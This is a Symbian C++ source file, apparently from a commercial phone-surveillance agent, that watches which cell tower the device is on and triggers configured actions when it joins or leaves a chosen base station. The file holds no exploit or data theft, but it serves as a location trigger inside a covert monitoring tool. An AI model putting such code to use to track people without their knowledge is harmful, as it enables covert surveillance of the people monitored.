/*
 ============================================================================
 Name		: EventCellId.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CEventCellId implementation
 ============================================================================
 */

#include "EventCellId.h"

CEventCellId::CEventCellId(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_CellID, aTriggerId), iNetInfoPckg(iNetInfo)
	{
	// No implementation required
	}

CEventCellId::~CEventCellId()
	{
	__FLOG(_L("Destructor"));
	delete iPhone;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	} 

CEventCellId* CEventCellId::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventCellId* self = new (ELeave) CEventCellId(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventCellId* CEventCellId::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventCellId* self = CEventCellId::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}

void CEventCellId::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN_ID("HT", "EventCellID.txt");
	__FLOG(_L("-------------"));
	
	BaseConstructL(params);
	iPhone = CPhone::NewL();
	iPhone->SetObserver(this);
	//iCellParams = (TCellIdStruct*) iParams.Ptr();
	Mem::Copy(&iCellParams, iParams.Ptr(), sizeof(iCellParams));
	
	if(iCellParams.iCell != -1)
		iCellParams.iCell = iCellParams.iCell & 0xFFFF;  // added jo'

	}

void CEventCellId::StartEventL()
	{
	// Initialize Properly the iWasConnectedToCell value, 
	// so if we're already connected to the CellID, the Out-Action will be 
	// triggered as soon as we will leave this CellID
	iPhone->GetCellIDSync(iNetInfoPckg);
	iWasConnectedToCell = ConnectedToCellID();
	
	if(iWasConnectedToCell)
	{
		// Triggers the In-Action
		SendActionTriggerToCoreL();
		
	}
	// Receives Notifications Changes of the CellID...
	iPhone->NotifyCellIDChange(iNetInfoPckg);
	}
/*
TBool CEventCellId::ConnectedToCellID()
	{
	__FLOG_1(_L("CellID: %d"), iNetInfo.iCellId);
	__FLOG_1(_L("LAC: %d"), iNetInfo.iLocationAreaCode);
	__FLOG(_L("MNC - MCC"));
	__FLOG(iNetInfo.iNetworkId);
	__FLOG(iNetInfo.iCountryCode);
	
	if (iCellParams.iCell != iNetInfo.iCellId)
		return EFalse;
	if (iCellParams.iLAC != iNetInfo.iLocationAreaCode)
		return EFalse;

	TBuf<CTelephony::KNetworkIdentitySize> paramMNC;
	paramMNC.AppendNum(iCellParams.iMNC);
	if (paramMNC != iNetInfo.iNetworkId)
		return EFalse;

	TBuf<CTelephony::KNetworkCountryCodeSize> paramMCC;
	paramMCC.AppendNum(iCellParams.iMCC);
	if (paramMCC != iNetInfo.iCountryCode)
		return EFalse;
 
	return ETrue; 
	}
*/

// This has been changed in order to permit "*" (-1) value in console configuration build
// TODO: check comparison between signed and unsigned integer
TBool CEventCellId::ConnectedToCellID()
	{
	__FLOG_1(_L("CellID: %d"), (iNetInfo.iCellId & 0xFFFF));  
	__FLOG_1(_L("LAC: %d"), iNetInfo.iLocationAreaCode);
	__FLOG(_L("MNC - MCC"));
	__FLOG(iNetInfo.iNetworkId);
	__FLOG(iNetInfo.iCountryCode);
	
	if ((iCellParams.iCell != -1) && (iCellParams.iCell != (iNetInfo.iCellId & 0xFFFF)))
		return EFalse;
	if ((iCellParams.iLAC != -1) && (iCellParams.iLAC != iNetInfo.iLocationAreaCode))
		return EFalse;

	TInt mnc = 0;
	TLex lexMnc(iNetInfo.iNetworkId);
	lexMnc.Val(mnc);
	if ((iCellParams.iMNC != -1) && (iCellParams.iMNC != mnc))
		return EFalse;

	TInt mcc = 0;
	TLex lexMcc(iNetInfo.iCountryCode);
	lexMcc.Val(mcc);
	if ((iCellParams.iMCC != -1) && (iCellParams.iMCC != mcc))
		return EFalse;

	return ETrue; 
	}

void CEventCellId::HandlePhoneEventL(TPhoneFunctions event)
	{
	__FLOG_1(_L("HandlePhoneEventL: %d"), event);
	if (event != ENotifyCellIDChange)
		return;

	if (ConnectedToCellID())
		{
		__FLOG(_L("Connected"));
		// Before trigger the event perform an additional check, just in case.
		if (!iWasConnectedToCell)
			{
			iWasConnectedToCell = ETrue;
			// Triggers the In-Action
			SendActionTriggerToCoreL();
			}
		}
	else
		{
		__FLOG(_L("NOT Connected"));
		if (iWasConnectedToCell)
			{
			iWasConnectedToCell = EFalse;
			// Triggers the Out-Action
			if (iCellParams.iExitAction != 0xFFFFFFFF)
				{
				SendActionTriggerToCoreL(iCellParams.iExitAction);
				}
			}
		}
	iPhone->NotifyCellIDChange(iNetInfoPckg);	
	}

/*
 EventCellId

 L'EventCellId, definito nel file di configurazione dal relativo EventId, triggera l'azione ad esso associata quando il device si connette, o disconnette, ad una determinata BTS.

 L'evento e' in grado di triggerare due azioni:

 1. In-Action: quando il device si connette alla BTS.
 2. Out-Action: quando il device si disconnette dall BTS. 

 Parametri

 L'evento riceve cinque parametri di configurazione all'interno della propria EventStruct:

 uExitAction
 E' un UINT ed assume il numero dell'azione da eseguire quando il device si disconnette dalla BTS (e' inizializzato a 0xffffffff nel caso in cui non ci sia alcuna out-action definita). 
 uMobileCountryCode
 E' un UINT ed indica il Mobile Country Code. 
 uMobileNetworkCode
 E' un UINT ed indica il Mobile Network Code. 
 uLocationAreaCode
 E' un UINT ed indica il Location Area Code. 
 uCellId
 E' un UINT ed indica il Cell Id. 
 */

